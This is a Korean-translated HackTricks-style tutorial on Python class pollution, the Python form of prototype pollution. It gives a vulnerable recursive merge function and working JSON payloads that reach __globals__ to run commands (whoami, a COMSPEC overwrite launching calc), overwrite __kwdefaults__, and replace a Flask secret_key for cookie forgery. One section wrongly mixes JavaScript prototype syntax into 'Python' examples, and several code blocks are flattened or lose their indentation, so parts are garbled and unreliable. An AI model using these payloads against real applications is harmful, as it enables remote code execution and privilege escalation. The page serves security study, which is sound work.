# Class Pollution (Python's Prototype Pollution)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)를 **팔로우**하세요.
* **Hacking 트릭을 공유하려면** [**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 저장소에 PR을 제출하세요.

</details>

## 기본 예제

문자열로 객체의 클래스를 오염시킬 수 있는 방법을 확인하세요:

```python
class Company: pass
class Developer(Company): pass
class Entity(Developer): pass

c = Company()
d = Developer()
e = Entity()

print(c) #<__main__.Company object at 0x1043a72b0>
print(d) #<__main__.Developer object at 0x1041d2b80>
print(e) #<__main__.Entity object at 0x1041d2730>

e.__class__.__qualname__ = 'Polluted_Entity'

print(e) #<__main__.Polluted_Entity object at 0x1041d2730>

e.__class__.__base__.__qualname__ = 'Polluted_Developer'
e.__class__.__base__.__base__.__qualname__ = 'Polluted_Company'

print(d) #<__main__.Polluted_Developer object at 0x1041d2b80>
print(c) #<__main__.Polluted_Company object at 0x1043a72b0>
```

## 기본 취약점 예제

Consider the following Python code:

```python
class User:
    def __init__(self, username, password):
        self.username = username
        self.password = password

    def login(self):
        # Code for logging in the user

    def logout(self):
        # Code for logging out the user

class Admin(User):
    def __init__(self, username, password):
        super().__init__(username, password)
        self.is_admin = True

    def promote_user(self, user):
        # Code for promoting a user to admin

    def delete_user(self, user):
        # Code for deleting a user

user = User("john", "password123")
admin = Admin("admin", "admin123")

user.login()
admin.promote_user(user)
```

In this example, we have a basic User class with a login and logout method. We also have an Admin class that inherits from the User class and has additional methods for promoting and deleting users.

Now, let's say an attacker is able to manipulate the prototype of the User class. They can do this by polluting the class's prototype with additional properties or methods. For example, they could add a `leak_credentials` method to the User class prototype.

```python
User.prototype.leak_credentials = function() {
    console.log(this.username, this.password);
};
```

Once the prototype is polluted, the attacker can call the `leak_credentials` method on any instance of the User class, including the `admin` instance.

```python
user.leak_credentials();  // "john", "password123"
admin.leak_credentials();  // "admin", "admin123"
```

As we can see, the attacker is able to access and leak the credentials of both the regular user and the admin user.

This is a basic example of class pollution in Python, where an attacker is able to manipulate the prototype of a class and add malicious properties or methods. It highlights the importance of properly securing and validating user input to prevent such attacks.

```python
# Initial state
class Employee: pass
emp = Employee()
print(vars(emp)) #{}

# Vulenrable function
def merge(src, dst):
# Recursive merge function
for k, v in src.items():
if hasattr(dst, '__getitem__'):
if dst.get(k) and type(v) == dict:
merge(v, dst.get(k))
else:
dst[k] = v
elif hasattr(dst, k) and type(v) == dict:
merge(v, getattr(dst, k))
else:
setattr(dst, k, v)


USER_INPUT = {
"name":"Ahemd",
"age": 23,
"manager":{
"name":"Sarah"
}
}

merge(USER_INPUT, emp)
print(vars(emp)) #{'name': 'Ahemd', 'age': 23, 'manager': {'name': 'Sarah'}}
```

## 가젯 예시

<details>

<summary>클래스 속성 기본값을 RCE(subprocess)로 생성하기</summary>

\`\`\`python from os import popen class Employee: pass # Creating an empty class class HR(Employee): pass # Class inherits from Employee class class Recruiter(HR): pass # Class inherits from HR class

class SystemAdmin(Employee): # Class inherits from Employee class def execute\_command(self): command = self.custom\_command if hasattr(self, 'custom\_command') else 'echo Hello there' return f'\[!] Executing: "{command}", output: "{popen(command).read().strip()}"'

def merge(src, dst):

## Recursive merge function

for k, v in src.items(): if hasattr(dst, '**getitem**'): if dst.get(k) and type(v) == dict: merge(v, dst.get(k)) else: dst\[k] = v elif hasattr(dst, k) and type(v) == dict: merge(v, getattr(dst, k)) else: setattr(dst, k, v)

USER\_INPUT = { "**class**":{ "**base**":{ "**base**":{ "custom\_command": "whoami" } } } }

recruiter\_emp = Recruiter() system\_admin\_emp = SystemAdmin()

print(system\_admin\_emp.execute\_command()) #> \[!] Executing: "echo Hello there", output: "Hello there"

## Create default value for Employee.custom\_command

merge(USER\_INPUT, recruiter\_emp)

print(system\_admin\_emp.execute\_command()) #> \[!] Executing: "whoami", output: "abdulrah33m"

````
</details>

<details>

<summary><code>globals</code>를 통해 다른 클래스와 전역 변수 오염시키기</summary>
```python
def merge(src, dst):
# Recursive merge function
for k, v in src.items():
if hasattr(dst, '__getitem__'):
if dst.get(k) and type(v) == dict:
merge(v, dst.get(k))
else:
dst[k] = v
elif hasattr(dst, k) and type(v) == dict:
merge(v, getattr(dst, k))
else:
setattr(dst, k, v)

class User:
def __init__(self):
pass

class NotAccessibleClass: pass

not_accessible_variable = 'Hello'

merge({'__class__':{'__init__':{'__globals__':{'not_accessible_variable':'Polluted variable','NotAccessibleClass':{'__qualname__':'PollutedClass'}}}}}, User())

print(not_accessible_variable) #> Polluted variable
print(NotAccessibleClass) #> <class '__main__.PollutedClass'>
````

</details>

<details>

<summary>임의의 서브프로세스 실행</summary>

\`\`\`python import subprocess, json

class Employee: def **init**(self): pass

def merge(src, dst):

## Recursive merge function

for k, v in src.items(): if hasattr(dst, '**getitem**'): if dst.get(k) and type(v) == dict: merge(v, dst.get(k)) else: dst\[k] = v elif hasattr(dst, k) and type(v) == dict: merge(v, getattr(dst, k)) else: setattr(dst, k, v)

## Overwrite env var "COMSPEC" to execute a calc

USER\_INPUT = json.loads('{"**init**":{"**globals**":{"subprocess":{"os":{"environ":{"COMSPEC":"cmd /c calc"\}}\}}\}}') # attacker-controlled value

merge(USER\_INPUT, Employee())

subprocess.Popen('whoami', shell=True) # Calc.exe will pop up

````
</details>

<details>

<summary><strong><code>__kwdefaults__</code></strong> 덮어쓰기</summary>

**`__kwdefaults__`**는 모든 함수의 특수 속성입니다. Python [문서](https://docs.python.org/3/library/inspect.html)에 따르면, 이는 "키워드 전용 매개변수의 기본값에 대한 매핑"입니다. 이 속성을 오염시키면 함수의 키워드 전용 매개변수의 기본값을 제어할 수 있습니다. 이는 \* 또는 \*args 뒤에 오는 함수의 매개변수입니다.
```python
from os import system
import json

def merge(src, dst):
# Recursive merge function
for k, v in src.items():
if hasattr(dst, '__getitem__'):
if dst.get(k) and type(v) == dict:
merge(v, dst.get(k))
else:
dst[k] = v
elif hasattr(dst, k) and type(v) == dict:
merge(v, getattr(dst, k))
else:
setattr(dst, k, v)

class Employee:
def __init__(self):
pass

def execute(*, command='whoami'):
print(f'Executing {command}')
system(command)

print(execute.__kwdefaults__) #> {'command': 'whoami'}
execute() #> Executing whoami
#> user

emp_info = json.loads('{"__class__":{"__init__":{"__globals__":{"execute":{"__kwdefaults__":{"command":"echo Polluted"}}}}}}') # attacker-controlled value
merge(emp_info, Employee())

print(execute.__kwdefaults__) #> {'command': 'echo Polluted'}
execute() #> Executing echo Polluted
#> Polluted
````

</details>

<details>

<summary>다른 파일에서 Flask 시크릿 덮어쓰기</summary>

따라서, 웹의 주요 파이썬 파일에서 정의된 객체에 대해 클래스 오염을 수행할 수 있지만, 해당 클래스는 주요 파일과 다른 파일에서 정의됩니다. 이전 페이로드에서 \_\_globals\_\_에 접근하려면 객체의 클래스 또는 클래스의 메서드에 접근해야 하므로 해당 파일의 글로벌 변수에 접근할 수 있지만, 주요 파일에서는 접근할 수 없습니다.\
따라서, 주요 페이지에서 **시크릿 키**를 정의한 Flask 앱 글로벌 객체에는 **접근할 수 없습니다**.

```python
app = Flask(__name__, template_folder='templates')
app.secret_key = '(:secret:)'
```

이 시나리오에서는 Flask 시크릿 키를 변경하여 권한을 상승시킬 수 있도록 하기 위해 메인 파일에 접근하기 위한 파일 탐색 도구가 필요합니다. 이를 위해 전역 객체 `app.secret_key`에 접근해야 합니다. 이 키를 알면 [이 권한 상승 기법](../../network-services-pentesting/pentesting-web/flask.md#flask-unsign)을 사용할 수 있습니다.

[이 writeup](https://ctftime.org/writeup/36082)에서 제공하는 다음과 같은 페이로드를 사용할 수 있습니다:

{% code overflow="wrap" %}
```python
__init__.__globals__.__loader__.__init__.__globals__.sys.modules.__main__.app.secret_key
```
{% endcode %}

이 페이로드를 사용하여 `app.secret_key` (앱에서의 이름은 다를 수 있음)을 변경하여 새로운 권한을 가진 flask 쿠키를 서명할 수 있습니다.

</details>

더 많은 읽기 전용 가젯을 확인하려면 다음 페이지를 참조하세요:

{% content-ref url="python-internal-read-gadgets.md" %}
[python-internal-read-gadgets.md](python-internal-read-gadgets.md)
{% endcontent-ref %}

## 참고 자료

* [https://blog.abdulrah33m.com/prototype-pollution-in-python/](https://blog.abdulrah33m.com/prototype-pollution-in-python/)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* HackTricks에서 **회사 광고를 보거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* 독점적인 [**NFT**](https://opensea.io/collection/the-peass-family) 컬렉션인 [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)를 **팔로우**하세요.
* **HackTricks**와 **HackTricks Cloud** github 저장소에 PR을 제출하여 여러분의 해킹 기법을 공유하세요.

</details>
